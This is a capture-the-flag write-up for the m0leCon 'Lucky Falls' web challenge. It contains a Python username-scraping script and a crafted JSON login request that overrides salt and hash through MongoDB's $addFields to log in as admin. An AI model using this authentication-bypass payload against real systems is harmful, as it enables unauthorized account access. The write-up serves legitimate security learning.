@@ -1,0 +1,100 @@
+
+<h1 class="sectionedit1" id="lucky_falls">Lucky Falls</h1>
+
+<p>
+This challenge prompts us with some text, a login box and a falling leaf.<br/>
+By analyzing the code we can deduct that the falling leaf is an obscure reference to mongoDB.
+</p>
+<hr />
+<!-- EDIT{&quot;target&quot;:&quot;section&quot;,&quot;name&quot;:&quot;Lucky Falls&quot;,&quot;hid&quot;:&quot;lucky_falls&quot;,&quot;codeblockOffset&quot;:0,&quot;secid&quot;:1,&quot;range&quot;:&quot;--1&quot;} -->
+<h2 class="sectionedit2" id="solution">Solution</h2>
+<ul>
+<li class="level0"><div class="li">First of all we can see that every time we reload the page we get a new username put in the header text, so we can write a simple script to dump all the usernames:</div>
+</li>
+</ul>
+<!-- EDIT{&quot;target&quot;:&quot;section&quot;,&quot;name&quot;:&quot;Solution&quot;,&quot;hid&quot;:&quot;solution&quot;,&quot;codeblockOffset&quot;:0,&quot;secid&quot;:2,&quot;range&quot;:&quot;--1&quot;} -->
+<h3 class="sectionedit3" id="code">Code</h3>
+<pre class="code python"><span class="kw1">from</span> requests <span class="kw1">import</span> Session
+<span class="kw1">from</span> <span class="kw3">os</span>.<span class="me1">path</span> <span class="kw1">import</span> exists
+<span class="kw1">from</span> <span class="kw3">os</span> <span class="kw1">import</span> makedirs
+<span class="kw1">def</span> parse_username<span class="br0">&#40;</span>html: <span class="kw2">str</span><span class="br0">&#41;</span> -<span class="sy0">&gt;</span> <span class="kw2">str</span>:
+    <span class="co1"># Bit of a shitty way but idc</span>
+    <span class="kw1">return</span> html.<span class="me1">split</span><span class="br0">&#40;</span><span class="st0">'&lt;div class=&quot;text-center flex-grow-1 text-nowrap&quot;&gt;'</span><span class="br0">&#41;</span><span class="br0">&#91;</span><span class="nu0">2</span><span class="br0">&#93;</span>.<span class="me1">split</span><span class="br0">&#40;</span><span class="st0">&quot;&lt;/div&gt;&quot;</span><span class="sy0">,</span> <span class="nu0">1</span><span class="br0">&#41;</span><span class="br0">&#91;</span><span class="nu0">0</span><span class="br0">&#93;</span>
+&nbsp;
+&nbsp;
+<span class="kw1">def</span> scrape_usernames<span class="br0">&#40;</span>no_progress_max: <span class="kw2">int</span> <span class="sy0">=</span> <span class="nu0">30</span><span class="br0">&#41;</span> -<span class="sy0">&gt;</span> <span class="kw2">dict</span>:
+    url <span class="sy0">=</span> <span class="st0">&quot;http://lucky-fall.challs.m0lecon.it/&quot;</span>
+    np <span class="sy0">=</span> <span class="nu0">0</span>
+    usernames <span class="sy0">=</span> <span class="br0">&#123;</span><span class="br0">&#125;</span>  <span class="co1"># {username: html_page}</span>
+    <span class="kw1">with</span> Session<span class="br0">&#40;</span><span class="br0">&#41;</span> <span class="kw1">as</span> sess:
+        <span class="kw1">while</span> np <span class="sy0">&lt;</span> no_progress_max:
+            np +<span class="sy0">=</span> <span class="nu0">1</span>
+            <span class="kw1">with</span> sess.<span class="me1">get</span><span class="br0">&#40;</span>url<span class="br0">&#41;</span> <span class="kw1">as</span> uname_req:
+                html <span class="sy0">=</span> uname_req.<span class="me1">text</span>
+                username <span class="sy0">=</span> parse_username<span class="br0">&#40;</span>html<span class="br0">&#41;</span>
+                <span class="kw1">if</span> username <span class="kw1">not</span> <span class="kw1">in</span> usernames:
+                    usernames.<span class="me1">update</span><span class="br0">&#40;</span><span class="br0">&#123;</span>username: html<span class="br0">&#125;</span><span class="br0">&#41;</span>
+                    np <span class="sy0">=</span> <span class="nu0">0</span>
+    <span class="kw1">return</span> usernames
+&nbsp;
+&nbsp;
+<span class="kw1">def</span> main<span class="br0">&#40;</span><span class="br0">&#41;</span>:
+    unames <span class="sy0">=</span> scrape_usernames<span class="br0">&#40;</span><span class="br0">&#41;</span>
+    unames_file <span class="sy0">=</span> <span class="kw2">open</span><span class="br0">&#40;</span><span class="st0">&quot;found_usernames.txt&quot;</span><span class="sy0">,</span> <span class="st0">'w'</span><span class="br0">&#41;</span>
+&nbsp;
+    <span class="kw1">if</span> <span class="kw1">not</span> exists<span class="br0">&#40;</span><span class="st0">&quot;./htmls/&quot;</span><span class="br0">&#41;</span>:
+        makedirs<span class="br0">&#40;</span><span class="st0">&quot;./htmls/&quot;</span><span class="br0">&#41;</span>
+&nbsp;
+    <span class="kw1">for</span> username <span class="kw1">in</span> unames:
+        unames_file.<span class="me1">write</span><span class="br0">&#40;</span>username + <span class="st0">'<span class="es0">\n</span>'</span><span class="br0">&#41;</span>
+        <span class="kw1">with</span> <span class="kw2">open</span><span class="br0">&#40;</span><span class="st0">&quot;./htmls/&quot;</span> + username + <span class="st0">&quot;.html&quot;</span><span class="sy0">,</span> <span class="st0">'w'</span><span class="br0">&#41;</span> <span class="kw1">as</span> html_file:
+            html_file.<span class="me1">write</span><span class="br0">&#40;</span>unames<span class="br0">&#91;</span>username<span class="br0">&#93;</span><span class="br0">&#41;</span>
+&nbsp;
+&nbsp;
+<span class="kw1">if</span> __name__ <span class="sy0">==</span> <span class="st0">&quot;__main__&quot;</span>:
+    main<span class="br0">&#40;</span><span class="br0">&#41;</span></pre>
+<ul>
+<li class="level0"><div class="li">Once we have all the usernames we can start analyzing the htmls for each username and see that they are all identical, nice</div>
+</li>
+<li class="level0"><div class="li">We can start trying some stuff out, like malforming the request</div>
+</li>
+<li class="level0"><div class="li">The request body that the server expects is <code>{&quot;name&quot;:&quot;&quot;,&quot;password&quot;:&quot;&quot;}</code></div>
+</li>
+<li class="level0"><div class="li">By not sending the username/password we can dump some of the background flask code</div>
+</li>
+<li class="level0"><div class="li">We can see that no username dumps out this string <code>user = users.aggregate([{&quot;$match&quot;: {&quot;user&quot;: request.json[&quot;name&quot;]}}, {&quot;$addFields&quot;: request.json}]).next() KeyError: &#039;name&#039; </code> </div>
+</li>
+<li class="level0"><div class="li">We can see that no password dumps out this string <code>if sha256(user[&quot;password&quot;] + user[&quot;salt&quot;]) == user[&quot;hash&quot;]:</code> (Welp the chall broke during this writeup so i dont have the exact string)</div>
+</li>
+<li class="level0"><div class="li">
+<p>
+Now, by analyzing the first string we can see that basically any key we send gets added to the user dict, and this happens right after the database request so we can easily overwrite the request with our stuff
+</p>
+</div>
+</li>
+<li class="level0"><div class="li">
+<p>
+To get the flag we can send this malformed request: <code>{&quot;name&quot;: &quot;admin&quot;, &quot;password&quot;: &quot;ciao&quot;, &quot;salt&quot;: &quot;&quot;, &quot;hash&quot;: &quot;b133a0c0e9bee3be20163d2ad31d6248db292aa6dcb1ee087a2aa50e0fc75ae2&quot;}</code>
+</p>
+</div>
+</li>
+</ul>
+
+<p>
+Basically what is happening is that we are:  
+</p>
+<ul>
+<li class="level0"><div class="li">sending the username &quot;admin&quot; that we got by scraping the usernames before </div>
+</li>
+<li class="level0"><div class="li">we send a password of our choice (In this case &quot;ciao&quot;) </div>
+</li>
+<li class="level0"><div class="li">we overwrite the databases salt with our own salt (In this case we left it blank)</div>
+</li>
+<li class="level0"><div class="li">we are sending our own password hash which is a sha256 hash of &quot;ciao&quot;</div>
+</li>
+</ul>
+
+<p>
+This works because of the addfields inside the aggregate function, which basically adds and overwrites keys in a mongodb response.<br/>
+Addfields is done after the database has returned its data, this makes it so we can manipulate said data.
+</p>
